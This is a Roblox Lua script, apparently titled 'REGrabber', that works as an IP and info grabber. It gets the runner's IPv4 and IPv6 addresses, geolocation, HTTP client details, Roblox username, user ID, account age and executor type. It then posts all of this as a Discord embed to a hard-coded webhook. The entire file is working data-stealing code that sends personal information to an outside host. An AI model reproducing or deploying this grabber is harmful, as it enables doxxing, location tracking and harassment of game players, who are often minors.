local IPv4 = game:HttpGet("https://api.ipify.org") -- IPv4 
local IPv6 = game:HttpGet("https://api64.ipify.org") -- IPv6 
local HTTPbin = game:HttpGet("https://httpbin.org/get") -- Getting some client info
local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4) -- Getting location info

local Headers = {["content-type"] = "application/json"} 

local LocalPlayer = game:GetService("Players").LocalPlayer -- LocalPlayer

local AccountAge = LocalPlayer.AccountAge -- Account age since created
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) -- Membership type: None or Premium
local UserId = LocalPlayer.UserId -- UserID
local PlayerName = LocalPlayer.Name -- Player name
local DisplayName= LocalPlayer.DisplayName
local PlaceID = game.PlaceId -- The game that player is playing


local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
local rver = "Version 0.2b" -- Change to your version if you want

function identifyexploit()
   local ieSuccess, ieResult = pcall(identifyexecutor)
   if ieSuccess then return ieResult end

   return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

--[[ Webhook ]]--
local PlayerData = {
        ["content"] = "",
        ["embeds"] = {{

            ["author"] = {
                ["name"] = "REGrabber "..rver, -- Grabber name and version
            },

            ["title"] = PlayerName, -- Username/PlayerName
            ["description"] = "aka "..DisplayName, -- Display Name/Nickname
            ["fields"] = {
                {
                    --[[Username/PlayerName]]--
                    ["name"] = "Username:",
                    ["value"] = PlayerName,
                    ["inline"] = true
                },
                {
                    --[[Membership type]]--
                    ["name"] = "Membership Type:",
                    ["value"] = MembershipType,
                    ["inline"] = true
                },
                {
                    --[[Account age]]--
                    ["name"] = "Account Age (days):",
                    ["value"] = AccountAge,
                    ["inline"] = true
                },
                {
                    --[[UserID]]--
                    ["name"] = "UserId:",
                    ["value"] = UserId,
                    ["inline"] = true
                },
                {
                    --[[IPv4]]--
                    ["name"] = "IPv4:",
                    ["value"] = IPv4,
                    ["inline"] = true
                },
                {
                    --[[IPv6]]--
                    ["name"] = "IPv6:",
                    ["value"] = IPv6,
                    ["inline"] = true
                },
                {
                    --[[PlaceID]]--
                    ["name"] = "Place ID: ",
                    ["value"] = PlaceID,
                    ["inline"] = true
                },
                {
                    --[[Exploit/Executor]]--
                    ["name"] = "Executor: ",
                    ["value"] = identifyexploit(),
                    ["inline"] = true
                },
                {
                    --[[Log/Grab time]]--
                    ["name"] = "Log Time:",
                    ["value"] = LogTime,
                    ["inline"] = true
                },
                {
                    --[[HTTPbin]]--
                    ["name"] = "HTTPbin Data (JSON):",
                    ["value"] = "```json"..'\n'..HTTPbin.."```",
                    ["inline"] = false
                },
                {
                    --[[geoPlugin]]--
                    ["name"] = "geoPlugin Data (JSON):",
                    ["value"] = "```json"..'\n'..GeoPlug.."```",
                    ["inline"] = false
                },
            },
        }}
    }


local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
    HttpRequest = syn.request
    else
    HttpRequest = http_request
end
local Webhook = "https://discord.com/api/webhooks/1283925249821511693/2WAPpdS8lMLx3Hu5UXFMBp4FQFQKUO7jREZ7MvFLUM8K4fElFIH1ZdhM29LByUhEzN2E"  --you thought heh? :money_mouth: just wanted to give erco an hearth attack
HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
